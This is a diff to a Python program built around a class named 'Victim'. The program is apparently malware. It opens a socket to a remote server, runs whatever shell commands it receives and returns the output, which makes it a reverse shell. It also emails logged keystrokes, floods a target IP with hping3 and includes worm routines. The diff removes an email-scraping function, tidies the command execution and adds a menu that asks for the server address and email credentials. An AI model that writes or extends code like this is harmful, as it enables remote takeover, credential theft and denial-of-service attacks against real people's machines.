@@ -1,19 +1,18 @@
-import requests
-from bs4 import BeautifulSoup
-import re
 import smtplib
 import os
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import keyboard
+import getpass
 import socket
 import time
 import psutil
 import subprocess
 import ast
 import winreg
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import keyboard
 
 
 class EmailSender:
@@ -52,30 +51,6 @@ class EmailSender:
             print("Failed to send email. Error:", str(e))
 
 
-def scrape_email_addresses(url):
-    email_addresses = []  # List to store the email addresses
-
-    # Send a GET request to the webpage
-    response = requests.get(url)
-    if response.status_code == 200:
-        # Create BeautifulSoup object to parse the HTML content
-        soup = BeautifulSoup(response.content, 'html.parser')
-
-        # Find all email addresses using regular expressions
-        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
-        found_emails = re.findall(email_pattern, soup.get_text())
-
-        # Remove duplicate email addresses and add them to the list
-        for email in found_emails:
-            if email not in email_addresses:
-                email_addresses.append(email)
-
-    else:
-        print(f"Failed to fetch webpage: {response.status_code}")
-
-    return email_addresses
-
-
 class Victim:
     def __init__(self, server_ip, server_port, email_address, password):
         self.server_ip = server_ip
@@ -87,13 +62,16 @@ class Victim:
     def connect_to_server(self):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        print("Msg: Client Initiated...")
-        self.client.connect((self.server_ip, self.server_port))
-        print("Msg: Connection initiated...")
+        print("Msg: Client initiated...")
+        try:
+            self.client.connect((self.server_ip, self.server_port))
+            print("Msg: Connection established.")
+        except ConnectionRefusedError:
+            print("Failed to connect to the server.")
 
     def online_interaction(self):
         while True:
-            print("[+] Awaiting Shell Commands...")
+            print("[+] Awaiting shell commands...")
             user_command = self.client.recv(1024).decode()
 
             if user_command.strip() == "exit":
@@ -105,15 +83,21 @@ class Victim:
                     ip_address = command_parts[1]
                     self.send_packets(ip_address)
             else:
-                op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-                output = op.stdout.read()
-                output_error = op.stderr.read()
+                output = self.execute_shell_command(user_command)
+                print("[+] Sending command output...")
+                self.client.send(output.encode())
 
-                print("[+] Sending Command Output...")
-                if output == b"" and output_error == b"":
-                    self.client.send(b"client_msg: no visible output")
-                else:
-                    self.client.send(output + output_error)
+    def execute_shell_command(self, command):
+        try:
+            process = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output = process.stdout.read()
+            error = process.stderr.read()
+            if output or error:
+                return output + error
+            else:
+                return "No visible output."
+        except subprocess.CalledProcessError as e:
+            return str(e)
 
     def send_email_with_keystrokes(self, keystrokes):
         if not self.email_address or not self.password:
@@ -178,7 +162,7 @@ class Victim:
 
     def send_packets(self, ip_address):
         hping_command = f"hping3 {ip_address} -d 65535 -c 0"
-        process = subprocess.Popen(hping_command, shell=True)
+        subprocess.Popen(hping_command, shell=True)
 
     def get_smtp_server_info(self):
         browsers = {
@@ -220,17 +204,74 @@ class Victim:
         return detected_browsers
 
 
+def get_server_ip():
+    while True:
+        server_ip = input("Enter the server IP address: ")
+        if validate_ip_address(server_ip):
+            return server_ip
+        else:
+            print("Invalid IP address. Please try again.")
+
+
+def validate_ip_address(ip_address):
+    parts = ip_address.split('.')
+    if len(parts) != 4:
+        return False
+    for part in parts:
+        if not part.isdigit() or int(part) < 0 or int(part) > 255:
+            return False
+    return True
+
+
+def get_server_port():
+    while True:
+        server_port = input("Enter the server port: ")
+        if server_port.isdigit() and 0 < int(server_port) <= 65535:
+            return int(server_port)
+        else:
+            print("Invalid port number. Please try again.")
+
+
+def get_email_credentials():
+    email_address = input("Enter your email address: ")
+    password = getpass.getpass("Enter your email password: ")
+    return email_address, password
+
+
+def print_menu():
+    print("Choose an option:")
+    print("1. Online interaction")
+    print("2. Start worm actions")
+    print("3. Exit")
+
+
+def get_user_choice():
+    while True:
+        try:
+            choice = int(input("Enter your choice: "))
+            if choice in [1, 2, 3]:
+                return choice
+            else:
+                print("Invalid choice. Please try again.")
+        except ValueError:
+            print("Invalid choice. Please try again.")
+
+
 if __name__ == '__main__':
-    choice = "online"  # "offline"
-    server_ip = '127.0.0.1'
-    server_port = 4000
-    email_address = ""
-    password = ""
+    server_ip = get_server_ip()
+    server_port = get_server_port()
+    email_address, password = get_email_credentials()
 
     victim = Victim(server_ip, server_port, email_address, password)
     victim.connect_to_server()
 
-    if choice == "online":
-        victim.online_interaction()
-    else:
-        victim.start_worm_actions()
+    while True:
+        print_menu()
+        choice = get_user_choice()
+
+        if choice == 1:
+            victim.online_interaction()
+        elif choice == 2:
+            victim.start_worm_actions()
+        elif choice == 3:
+            break
